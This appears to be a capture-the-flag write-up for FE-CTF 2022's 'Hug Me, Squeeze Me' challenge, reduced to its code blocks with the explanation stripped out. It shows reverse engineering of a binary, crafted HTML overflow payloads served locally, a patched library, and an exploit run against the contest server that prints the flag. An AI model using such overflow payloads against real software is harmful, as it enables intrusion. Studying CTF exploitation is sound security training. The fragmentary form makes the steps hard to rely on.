# FE-CTF 2022: Cyber Demon – Hug Me, Squeeze Me

> 原文: https://www.ctfiot.com/78935.html
> ID: 78935


```
SECTIONS {
 . = SIZEOF_HEADERS;
 /* Easter egg */
 _STRIP_ELF_BEFORE_CTF_ = 0x1337;
 [...]
$ nc xoxo.hack.fe-ctf.dk 1337
== proof-of-work: disabled ==
> help
wat
> menu
wat
> usage
wat
>
$ env LD_LIBRARY_PATH=$PWD ./words.elf
>
$ env LD_LIBRARY_PATH=$PWD ./words.elf
> Halp
Commands:
 Count[=yes/no]
 Unique[=yes/no]
 Ignore case[=yes/no]
 Verbose[=yes/no]
 Links[=on/off]
 Words[=on/off]
 Fetch 
>
OPT(Count , count , yes, no);
 OPT(Unique , unique , yes, no);
 OPT(Ignore case, caseign, yes, no);
 OPT(Verbose , verbose, yes, no);
 OPT(Verbose , verbose, yes, no);
 OPT(Links , clinks , on, off);
 OPT(Words , cwords , on, off);
get(char *url, char **contentsout)
$ env LD_LIBRARY_PATH=$PWD ./words.elf
> Verbose=yes
> Fetch https://www.google.com
Killed
$ (echo Verbose=yes ; echo Fetch https://www.google.com) | \
env LD_LIBRARY_PATH=$PWD ./words.elf
> > =============
532c
<!doctype html>[...]
$ nm -Du words.elf
 U accept@GLIBC_2.2.5
[...]
 U __xstat64@GLIBC_2.2.5
$ mv libsqz.so real-libsqz.so
$ touch libsqz.c
$ gcc -shared libsqz.c -o libsqz.so
$ (echo Verbose=yes ; echo Fetch https://neverssl.com) | \
env LD_LIBRARY_PATH=$PWD ./words.elf
> > =============
<html>
[...]
char *url = &input[6]; // 6 == strlen("Fetch ")
char *data;
if (get(url, &data)) {
 if (g_verbose) {
 printf("=============\n%s\n=============\n", data);
 }
 count(data);
 if (g_clinks) {
 puts("LINKS:");
 show(g_links);
 }
 if (g_cwords) {
 puts("WORDS:");
 show(g_words);
 }
}
srand(getpid() + time(NULL));
getbuf = (unsigned char *)((unsigned long)rand() << 12);
void insert(void *list, const char *item) {
 int i;
 if (g_caseign)
 lower(item);
 for (i = 0; *((int *)list + 65 * i + 64) &&
 (!g_unique && !g_count ||
 strcmp((const char *)list + 260 * i, item)); i++);
 if (!*((unsigned char *)list + 260 * i))
 strcpy((char *)list + 260 * i, item);
 *((int *)list + 65 * i + 64)++;
struct list_item {
 char value[256];
 int count;
};
struct list_item g_words[10000], g_links[10000];
void insert(struct list_item *list, const char *item) {
 int i;
 if (g_caseign)
 lower(item);
 for (i = 0; list[i].count; i++) {
 if ((g_unique || g_count) && 0 == strcmp(list[i].value, item))
 break;
 }
 if (!list[i].value[0])
 strcpy(list[i].value, item);
 list[i].count++;
}
void lower(char *buf) {
 char *p, c;
 for (p = buf; c = *p; p++) {
 if ('%' == c) {
 p += 2;
 continue;
 } else if ('A' <= c && c <= 'Z') {
 *p |= 0x20;
 }
 }
}
char value_or_word[256];
void (*handler_for_current_tag)(char *, char *);
>>> divmod(0x642dab - 0x46aa00, 260)
(7439, 111)
$ python -c 'print("<a href=" + "X"*254 + "% x>")' > foo
$ python -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:
8080/) ...
$ env LD_LIBRARY_PATH=$PWD gdb ./words.elf
(gdb) run
Starting program: /home/user/words.elf
> Ignore case=yes
> Fetch http://localhost:
8080/foo

Program received signal SIGSEGV, Segmentation fault.
0x0000000000642dab in g_words ()
(gdb)
$ readelf -d libsqz.so
Dynamic section at offset 0xa008 contains 11 entries:
 Tag Type Name/Value
 0x000000000000000c (INIT) 0x460
 0x0000000000000004 (HASH) 0x120
 0x0000000000000005 (STRTAB) 0x168
 0x0000000000000006 (SYMTAB) 0x138
 0x000000000000000a (STRSZ) 24 (bytes)
 0x000000000000000b (SYMENT) 24 (bytes)
 0x0000000000000007 (RELA) 0x9c20
 0x0000000000000008 (RELASZ) 24 (bytes)
 0x0000000000000009 (RELAENT) 24 (bytes)
 0x000000006ffffff9 (RELACOUNT) 1
 0x0000000000000000 (NULL) 0x0
void sigsegv_handler(int signum, siginfo_t *si) {
 if (!restore(si->si_addr)) {
 result = kill(getpid(), SIGKILL);
 }
}
void thread() {
 for (;;) {
 squeeze();
 usleep(100000);
 }
}
typedef struct _chain {
 uint8_t *key;
 void *elm;
 struct _chain *next;
} chain_t;
typedef struct {
 size_t keylen;
 unsigned int keymask;
 chain_t **buckets;
} map_t;
void map_init(size_t keylen, size_t nbuckets, map_t *mapout);
bool map_insert(map_t *map, uint8_t *key, void *elm);
bool map_lookup(map_t *map, uint8_t *key, void **elmout);
bool map_member(map_t *map, uint8_t *key);
bool map_pop(map_t *map, uint8_t *key, void **elmout);
bool map_delete(map_t *map, uint8_t *key);
struct page {
 uint8_t hash[SHA1_DIGEST_SIZE];
 unsigned int refs;
 uint8_t *data;
 size_t numb;
 int prot;
}

struct mapping {
 size_t id;
 void *addr;
 struct page *page;
}
mapping = malloc(sizeof(struct mapping));
mapping->addr = addr;
mapping->page = page;
mapping->id = (unsigned long)addr >> 12;
if (map_insert(&mappings, (uint8_t*)&mapping->id, mapping)) {
 kill(getpid(), SIGKILL);
}
prot = PROT_NONE;
if ('r' == maps_line_prot[0]) {
 prot |= PROT_READ;
}
if ('w' == maps_line_prot[1]) {
 prot |= PROT_WRITE;
}
if ('x' == maps_line_prot[2]) {
 prot |= PROT_EXEC;
}
[...]
page->prot |= prot;
$ dd if=words.elf of=foo bs=4096 count=10
10+0 records in
10+0 records out
40960 bytes (41 kB, 40 KiB) copied, 0.000216397 s, 189 MB/s
$ dd if=/dev/zero of=bar bs=4096 count=1
1+0 records in
1+0 records out
4096 bytes (4.1 kB, 4.0 KiB) copied, 9.1079e-05 s, 45.0 MB/s
$ python -c 'print("<a href=" + "X"*254 + "% x>")' > baz
$ python -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:
8080/) ...
$ (
> echo Ignore case=yes
> echo Fetch http://localhost:
8080/foo
> sleep 1
> echo Fetch http://localhost:
8080/bar
> sleep 1
> echo Fetch http://localhost:
8080/baz
) | env LD_LIBRARY_PATH=$PWD ./words.elf
> > WORDS:
 elf
> WORDS:
> Killed
[...]
 400: e8 07 fe ff ff call 20c <getpid>
 405: be 09 00 00 00 mov esi,0x9
 40a: 89 c7 mov edi,eax
 40c: 48 83 c4 08 add rsp,0x8
 410: e9 ff fd ff ff jmp 214 <kill>
[...]
$ dd if=<(echo -ne '\x06') of=libsqz.so bs=1 seek=$((0x406)) conv=notrunc
$ ulimit -c unlimited
$ (
> echo Ignore case=yes
> echo Fetch http://localhost:
8080/foo
> sleep 1
> echo Fetch http://localhost:
8080/bar
> sleep 1
> echo Fetch http://localhost:
8080/baz
) | env LD_LIBRARY_PATH=$PWD ./words.elf
> > WORDS:
 elf
> WORDS:
> Aborted (core dumped)
$ gdb words.elf core
(gdb) bt
#0 0x00007f8a6dbf921b in ?? ()
#1 <signal handler called>
#2 0x0000000000642dab in g_words ()
#3 0x000000000044344e in count ()
#4 0x0000000000443f7f in main ()
$ readelf -l core
[...]
 LOAD 0x00000000001ad000 0x000000000046b000 0x0000000000000000
 0x0000000000279000 0x0000000000279000 RWE 0x1000
 LOAD 0x0000000000426000 0x00000000006e4000 0x0000000000000000
 0x000000000027b000 0x000000000027b000 RWE 0x1000
 LOAD 0x00000000006a1000 0x000000000095f000 0x0000000000000000
 0x0000000000002000 0x0000000000002000 RWE 0x1000
[...]
$ python -c 'print("X " * 7439 + "X"*111 + "ua")' > baz
$ python -c 'print("<a href=" + "X"*254 + "% x>")' >> baz
$ (
> echo Ignore case=yes
> echo Fetch http://localhost:
8080/foo
> sleep 1
> echo Fetch http://localhost:
8080/bar
> sleep 1
> echo Fetch http://localhost:
8080/baz
) | env LD_LIBRARY_PATH=$PWD ./words.elf
> > WORDS:
 elf
> WORDS:
> Aborted (core dumped)
$ gdb words.elf core
(gdb) bt
#0 0x00007f0686c3f21b in ?? ()
#1 <signal handler called>
#2 0x0000000000642e0e in g_words ()
#3 0x000000000044344e in count ()
#4 0x0000000000443f7f in main ()
$ python doit.py
[*] '/home/user/words.elf'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:
8080/) ...
[+] Opening connection to xoxo.hack.fe-ctf.dk on port 1337: Done
x.x.x.x - - [20/Nov/2022 17:52:53] "GET a HTTP/1.1" 200 -
x.x.x.x - - [20/Nov/2022 17:52:55] "GET b HTTP/1.1" 200 -
x.x.x.x - - [20/Nov/2022 17:52:57] "GET c HTTP/1.1" 200 -
[*] Switching to interactive mode
$ cat flag
flag{a good^W^Wan idea taken to its natural conlusion}
$
```
